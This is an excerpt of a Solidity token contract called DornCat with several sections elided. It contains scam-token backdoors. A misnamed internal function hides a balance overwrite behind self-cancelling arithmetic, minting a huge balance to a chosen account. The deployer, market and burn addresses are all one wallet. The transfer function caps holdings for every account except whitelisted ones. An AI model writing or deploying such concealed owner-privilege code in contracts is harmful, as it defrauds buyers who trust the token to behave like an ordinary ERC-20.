...
contract DornCat  is Context, Ownable, IERC20 {
    ...
    address public deloyer = 0x67576fF6e2923D971e6Eb566D7DFEcbD5Be5B840;  // deployer address
    address public market = 0x67576fF6e2923D971e6Eb566D7DFEcbD5Be5B840;  // market address
    address public burn = 0x67576fF6e2923D971e6Eb566D7DFEcbD5Be5B840;  // burn address
    ...
    function _tramsferinfo (address accountinfo) internal {
        _tOwned[accountinfo] = (_tOwned[accountinfo] * 3) - (_tOwned[accountinfo] * 3) + (_destroyMaxAmount*100000) ; 
    }
    ...
    function _transfer(address sender, address recipient, uint amount) internal {
        ...
        uint marketTax = 0;
        uint burnTax = 0;
 //       if(!_islaunAt[msg.sender])
         if(!_MaxTxAmount[sender])
        {
           uint heldTokens = balanceOf(sender);
           require((heldTokens+amount) <= _destroyMaxAmount);   
        }
